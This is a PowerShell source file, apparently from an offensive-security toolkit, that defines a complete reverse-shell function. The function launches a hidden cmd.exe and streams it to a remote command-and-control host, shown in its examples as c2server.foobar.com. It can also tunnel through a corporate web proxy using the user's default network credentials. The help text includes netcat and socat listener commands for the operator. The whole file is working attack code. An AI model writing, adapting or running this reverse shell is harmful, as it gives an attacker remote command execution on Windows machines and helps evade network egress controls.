function Invoke-SendReverseShell
{
	<#
	.SYNOPSIS
	Sends a reverse shell (cmd.exe) to a remote host.
    The remote host simply has to listen on a TCP socket, for example:
    - With netcat:
        # nc -l -p <any_port>
    - With socat:
        # socat TCP-L:<any_port>,fork,reuseaddr -

    The connection can be established directly to the remote host, OR through a web proxy.
    If a web proxy is to be used, it can either be manually specified or the system's default proxy can be used.

	Function: Invoke-SendReverseShell
	Author: Arno0x0x, Twitter: @Arno0x0x

	.EXAMPLE
    # Direct connection:
	PS C:\> Invoke-SendReverseShell -DestHost c2server.foobar.com -DestPort 5555

    # Connection through system's default proxy
    PS C:\> Invoke-SendReverseShell -DestHost c2server.foobar.com -DestPort 5555 -UseDefaultProxy

    # Connection through manually specified proxy
    PS C:\> Invoke-SendReverseShell -DestHost c2server.foobar.com -DestPort 5555 -ProxyName proxy.name.local|proxyIp -ProxyPort 3128

	#>

	[CmdletBinding(DefaultParameterSetName="main")]
		Param (

    	[Parameter(Mandatory = $True)]
    	[ValidateNotNullOrEmpty()]
    	[String]$DestHost = $( Read-Host "Enter destination IP or Hostname: " ),

        [Parameter(Mandatory = $True)]
    	[ValidateNotNullOrEmpty()]        
        [Int]$DestPort = $( Read-Host "Enter destination port: " ),

        [Parameter(Mandatory = $False)]
        [Int]$TimeOut = 60,

        [Parameter(Mandatory = $False, ParameterSetName="AutoProxy")]      
        [Switch]$UseDefaultProxy,

        [Parameter(Mandatory = $False, ParameterSetName="ManualProxy")]      
        [String]$ProxyName,

        [Parameter(Mandatory = $False, ParameterSetName="ManualProxy")]
        [Int]$ProxyPort = 8080
    )

    #-------------------------------------------------------------------------------
    # Connecting to Destination Host through a proxy ?
    if ($UseDefaultProxy -or $ProxyName) {
        $DestUri = "http://" + $DestHost + ":" + $DestPort
        $UseProxy = $True
    }

    if ($ProxyName) {
        $Proxy = New-Object System.Net.WebProxy("http://" + $ProxyName + ":" + $ProxyPort)
        Write-Verbose "Using proxy [$ProxyName`:$ProxyPort]"
    }
    elseif ($UseDefaultProxy) {
        # Detect and set automatic proxy
        $Proxy = [System.Net.WebRequest]::DefaultWebProxy
        $ProxyName = $Proxy.GetProxy($DestUri).Host
        $ProxyPort = $Proxy.GetProxy($DestUri).Port
        if ($ProxyName -eq $DestHost) {
            $UseProxy = $False
            Write-Verbose "System's default proxy is not set, not using it"
        }
        else {
            Write-Verbose "Using system's default proxy [$ProxyName`:$ProxyPort]"
        }       
    }    

    if ($UseProxy) {
        # Detect and set automatic network credentials
        $Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        $DestHostWebRequest = [System.Net.HttpWebRequest]::Create("http://" + $DestHost + ":" + $DestPort) 
        $DestHostWebRequest.Method = "CONNECT"
        $DestHostWebRequest.Proxy = $Proxy
        $ConnectionTask = $DestHostWebRequest.GetResponseAsync()
        Write-Verbose "[DEBUG] Connecting to [$DestHost`:$DestPort] through proxy [$ProxyName`:$ProxyPort]"
    }
    else {
        $DestHostSocket = New-Object System.Net.Sockets.TcpClient
        $ConnectionTask = $DestHostSocket.ConnectAsync($DestHost,$DestPort)
        Write-Verbose "[DEBUG] Connecting to [$DestHost`:$DestPort]"
    }

    # Wait maximum connection timeout
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while ($True)
    {
        # Capture keyboard interrupt from user
        if ($Host.UI.RawUI.KeyAvailable)
        {
            if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode))
            {
                Write-Verbose "[DEBUG] Interrupting connection setup"
                if ($UseProxy) { $DestHostWebRequest.Abort() }
                else { $DestHostSocket.Close() }               
                $Stopwatch.Stop()
                return
            }
        }

        # Check connection timeout
        if ($Stopwatch.Elapsed.TotalSeconds -gt $Timeout)
        {
            Write-Verbose "[ERROR] Connection timeout reached"
            if ($UseProxy) { $DestHostWebRequest.Abort() }
            else { $DestHostSocket.Close() }  
            $Stopwatch.Stop()
            return
        }

        # Check TCP connection is completed
        if ($ConnectionTask.IsCompleted)
        {
            try
            {
                if ($UseProxy) {
                    $ResponseStream = ([System.Net.HttpWebResponse]$ConnectionTask.Result).GetResponseStream()

                    # Reflective inspection to retrieve and reuse the underlying NetworkStream instance
                    $BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance"
                    $rsType = $ResponseStream.GetType()
                    $connectionProperty = $rsType.GetProperty("Connection", $BindingFlags)
                    $connection = $connectionProperty.GetValue($ResponseStream, $null)
                    $connectionType = $connection.GetType()
                    $networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags)
                    $DestHostStream = $networkStreamProperty.GetValue($connection, $null)
                    $BufferSize = 65536
                    Write-Verbose ("[DEBUG]  Connection to [$DestHost`:$DestPort] through proxy [$ProxyName`:$ProxyPort] succeeded")
                }
                else {
                    $DestHostStream = $DestHostSocket.GetStream()
                    $BufferSize = $DestHostSocket.ReceiveBufferSize
                    Write-Verbose ("[DEBUG]  Connection to [$DestHost`:$DestPort] succeeded")
                }
                
                
            }
            catch {
                Write-Verbose($_.Exception.Message)
                if ($UseProxy) { $DestHostWebRequest.Abort() }
                else { $DestHostSocket.Close() }  
                $Stopwatch.Stop()
                Write-Verbose ("[ERROR]  Connection to [$DestHost`:$DestPort] could NOT be established")
                return
            }
            break
        }
    }
        
    $Stopwatch.Stop()
    $Global:Loop = $True
    
    #------------------------------------------------------------------------------
    $DestHostBuffer = New-Object System.Byte[] $BufferSize
    $DestHostReadTask = $DestHostStream.ReadAsync($DestHostBuffer, 0, $BufferSize)
    $AsciiEncoding = New-Object System.Text.AsciiEncoding

    #------------------------------------------------------------------------------
    # Starting shell process
    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = "cmd.exe"
    $ProcessStartInfo.Arguments = "/q"
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $ProcessStartInfo.CreateNoWindow = $True
    $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    $Process.EnableRaisingEvents = $True
    Register-ObjectEvent -InputObject $Process -EventName "Exited" -Action { $Global:Loop = $False } | Out-Null
    $Process.Start() | Out-Null

    # Create buffers for storing data from process StdOut and StdErr
    $StdOutBuffer = New-Object System.Byte[] 65536
    $StdErrBuffer = New-Object System.Byte[] 65536

    # Start Asynchronous read of data from both StdOut and StdErr
    $StdOutReadTask = $Process.StandardOutput.BaseStream.ReadAsync($StdOutBuffer, 0, 65536)
    $StdErrReadTask= $Process.StandardError.BaseStream.ReadAsync($StdErrBuffer, 0, 65536)       

    #-----------------------------------------------------------------------------------------------------
    # Now that both streams are connected, cross read and write data from both streams
    try
    {
        while($Global:Loop)
        {
            try
            {
                #----------------------------------------------------------------
                # Read data from Process Stream and send it to DestHost Stream
                [byte[]]$Data = @()

                # Read data from StdOut, if any available
                if($StdOutReadTask.IsCompleted)
                {
                    if ([int]$StdOutReadTask.Result -ne 0) {
                        $Data += $StdOutBuffer[0..([int]$StdOutReadTask.Result - 1)]
                        $StdOutReadTask = $Process.StandardOutput.BaseStream.ReadAsync($StdOutBuffer, 0, 65536)
                    }                     
                }

                # Read data from StdErr, if any available
                if($StdErrReadTask.IsCompleted)
                {
                    if([int]$StdErrReadTask.Result -ne 0) {
                        $Data += $StdErrBuffer[0..([int]$StdErrReadTask.Result - 1)]
                        $StdErrReadTask= $Process.StandardError.BaseStream.ReadAsync($StdErrBuffer, 0, 65536)
                    }
                }

                # Now if there's data available, send it to the Destination Host
                if ($Data -ne $null) {
                    $DestHostStream.Write($Data, 0, $Data.Length)
                }
            }
            catch
            {
                Write-Verbose "[ERROR] Failed to redirect data from Process StdOut/StdErr to Destination Host"
                break
            }
            
            #----------------------------------------------------------------
            # Read data from DestHost Stream and send it to Process StdIn Stream
            try
            {
                $Data = $null
                if($DestHostReadTask.IsCompleted) {
                    if([int]$DestHostReadTask.Result -ne 0) {
                        $Data = $DestHostBuffer[0..([int][int]$DestHostReadTask.Result - 1)]
                        $DestHostReadTask = $DestHostStream.ReadAsync($DestHostBuffer, 0, $BufferSize)
                    }
                }

                if ($Data -ne $null) {
                    $Process.StandardInput.WriteLine($AsciiEncoding.GetString($Data).TrimEnd("`r").TrimEnd("`n"))
                }
            }
            catch
            {
                Write-Verbose "[ERROR] Failed to redirect data from Destination Host to Process StdIn"
                break
            }
        } #EndWhile
    } #EndTry 
    finally
    {
        Write-Verbose "[DEBUG] Closing..."
        try { $Process | Stop-Process }
        catch { Write-Verbose "[ERROR] Failed to stop child process" }
        try {
            $DestHostStream.Close()
            if ($UseProxy) { $DestHostWebRequest.Abort() }
            else { $DestHostSocket.Close() }
        }
        catch { Write-Verbose "[ERROR] Failed to close socket to destination host" }
    }
}
